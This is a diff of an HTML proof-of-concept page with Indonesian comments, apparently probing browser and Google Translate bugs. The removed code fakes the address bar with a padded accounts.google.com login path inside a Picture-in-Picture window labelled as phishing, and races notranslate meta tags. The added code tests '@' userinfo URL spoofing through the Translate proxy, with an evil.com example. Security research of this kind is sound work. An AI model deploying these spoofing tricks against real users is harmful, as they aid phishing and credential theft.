@@ -3,173 +3,25 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PiP Translate Race Condition</title>
-
-<!-- META TAG GLOBAL YANG AKAN DI-BYPASS -->
-<meta name="google" content="notranslate">
-<meta name="google" content="notranslate">
-
+<title>Translate API Userinfo Spoofing</title>
 <style>
-  #content {
-    display: none;
-    padding: 20px;
-    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-    background: #fff;
-    height: 100vh;
-    box-sizing: border-box;
-  }
-  #content h3 { color: #4285f4; }
-  #content p { color: #666; font-size: 14px; }
-  #content .translated-text {
-    margin-top: 15px;
-    padding: 15px;
-    background: #f8f8f8;
-    border: 1px solid #ddd;
-    border-radius: 6px;
-    min-height: 100px;
-  }
-  #status { margin-top: 12px; font-family: monospace; font-size: 12px; }
+  body { font-family: sans-serif; padding: 40px; text-align: center; }
+  iframe { width: 100%; height: 500px; border: 1px solid #ccc; margin-top: 20px; }
 </style>
 </head>
 <body>
 
-<button id="button">Open PiP & Translate</button>
-<div id="status">[*] Ready...</div>
+<h2>Translate API Userinfo (@) Spoofing</h2>
+<p>Mengirim URL dengan Userinfo @ ke Google Translate API.</p>
 
-<div id="content">
-  <h3>Legal Document (Protected)</h3>
-  <p class="translated-text" id="targetText">
-    This is a legal document that should NOT be translated. It contains confidential information, bank account numbers, and transaction IDs. By using this page, you agree to the terms and conditions.
-  </p>
-</div>
+<!-- URL yang dikirim ke Translate API -->
+<!-- https://translate.google.com/translate?sl=auto&tl=id&u=https://google.com@evil.com -->
 
-<script>
-(function () {
-  'use strict';
+<iframe src="https://translate.google.com/translate?sl=auto&tl=id&u=https://www.google.com@www.microsoft.com"></iframe>
 
-  const button = document.getElementById('button');
-  const content = document.getElementById('content');
-  const statusEl = document.getElementById('status');
-  const targetText = document.getElementById('targetText');
+<p style="margin-top: 20px; color: #666; font-size: 14px;">
+  Jika Google Translate menerjemahkan halaman Microsoft (bukan Google), maka URL spoofing berhasil.
+</p>
 
-  // ============================================
-  // 1. RACE CONDITION: HAPUS META NOTRANSLATE
-  // ============================================
-  let counter = 0;
-  let isRunning = true;
-
-  function mutateMeta() {
-    if (!isRunning) return;
-
-    // Hapus semua meta notranslate
-    document.querySelectorAll('meta[name="google"][content="notranslate"]').forEach(m => m.remove());
-
-    // Tambahkan lagi setelah 0ms
-    setTimeout(() => {
-      if (isRunning) {
-        for (let i = 0; i < 5; i++) {
-          const newMeta = document.createElement('meta');
-          newMeta.name = 'google';
-          newMeta.content = 'notranslate';
-          document.head.appendChild(newMeta);
-        }
-      }
-    }, 0);
-
-    // Mutasi content
-    document.querySelectorAll('meta[name="google"]').forEach(meta => {
-      meta.content = counter % 2 === 0 ? 'translate' : 'notranslate';
-    });
-
-    counter++;
-    if (counter % 1000 === 0) {
-      statusEl.textContent = `[*] Meta mutation count: ${counter}`;
-    }
-
-    requestAnimationFrame(mutateMeta);
-  }
-
-  // ============================================
-  // 2. TRANSLATE API (GOOGLE TRANSLATE UNOFFICIAL)
-  // ============================================
-  async function translateText(text, targetLang = 'id') {
-    try {
-      // Gunakan Google Translate API tidak resmi (endpoint client-side)
-      const url = `https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=${targetLang}&dt=t&q=${encodeURIComponent(text)}`;
-      
-      const res = await fetch(url);
-      if (!res.ok) throw new Error('HTTP ' + res.status);
-      
-      const data = await res.json();
-      // Format response: [[["translated","original",...]],...]
-      if (data && data[0]) {
-        return data[0].map(item => item[0]).join('');
-      }
-      return text;
-    } catch (e) {
-      statusEl.textContent = '[-] Translate error: ' + e.message;
-      return text;
-    }
-  }
-
-  // ============================================
-  // 3. DOCUMENT PiP PHISHING + TRANSLATE
-  // ============================================
-  async function openPiPTranslate() {
-    try {
-      // Spoof URL (jika memungkinkan)
-      history.replaceState(null, '', '?..............................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................https://accounts.google.com/login/device/verify');
-
-      if (!window.documentPictureInPicture) {
-        alert("Document Picture-in-Picture tidak didukung.");
-        return;
-      }
-
-      // Buka PiP
-      const pipWindow = await window.documentPictureInPicture.requestWindow({
-        width: 500,
-        height: 500
-      });
-
-      // Reset URL setelah 1 detik
-      setTimeout(() => {
-        history.replaceState(null, '', '/');
-      }, 1000);
-
-      // Pindahkan konten ke PiP
-      content.style.display = 'block';
-      pipWindow.document.body.append(content);
-
-      // ============================================
-      // 4. TERJEMAHKAN TEKS DI PiP (BYPASS NOTRANSLATE)
-      // ============================================
-      statusEl.textContent = '[*] Translating in PiP...';
-
-      const originalText = targetText.textContent;
-      const translated = await translateText(originalText, 'id');
-
-      // Ganti teks di PiP dengan terjemahan
-      targetText.textContent = translated;
-
-      statusEl.textContent = '[+] Translation completed in PiP!';
-
-    } catch (err) {
-      statusEl.textContent = '[-] Error: ' + err.message;
-    }
-  }
-
-  // ============================================
-  // 5. TRIGGER
-  // ============================================
-  button.addEventListener('click', function () {
-    // Mulai Race Condition
-    requestAnimationFrame(mutateMeta);
-
-    // Buka PiP + Translate
-    openPiPTranslate();
-  }, { once: true });
-
-})();
-</script>
 </body>
 </html>
